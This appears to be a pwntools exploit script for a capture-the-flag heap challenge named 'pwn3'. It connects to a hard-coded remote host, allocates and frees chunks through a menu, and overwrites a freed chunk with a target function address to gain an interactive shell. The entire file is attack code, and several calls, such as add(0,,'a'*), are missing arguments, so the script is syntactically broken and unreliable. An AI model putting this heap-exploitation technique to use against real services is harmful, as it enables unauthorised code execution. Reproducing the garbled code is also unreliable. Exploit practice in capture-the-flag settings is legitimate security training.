#coding=utf8
from pwn import *
context.log_level = 'debug'
#context.terminal = ['gnome-terminal','-x','bash','-c']

local = 0

if local:
	n = process('./pwn3')
	elf = ELF('./pwn3',checksec=False)
else:
	n = remote('47.104.16.75',8999)
	elf = ELF('./pwn3',checksec=False)


def menu(num):
	n.recvuntil('2 delete paper')
	n.sendline(str(num))

def add(idx,size,content):
	n.recvuntil(':')
	n.sendline(str(idx))
	n.recvuntil(':')
	n.sendline(str(size))
	n.recvuntil(':')
	n.sendline(content)

def free(num):
	n.recvuntil(':')
	n.sendline(str(num))

gg_addr = 0x400943

menu(1) #in add
add(0,,'a'*) #add 0
menu(1)
add(1,,'a'*) #add 1

menu(2)
free(0)	#free 0
menu(2)
free(1)	#free 1

menu(1)
add(0,,p64(gg_addr))	#add 2
n.interactive()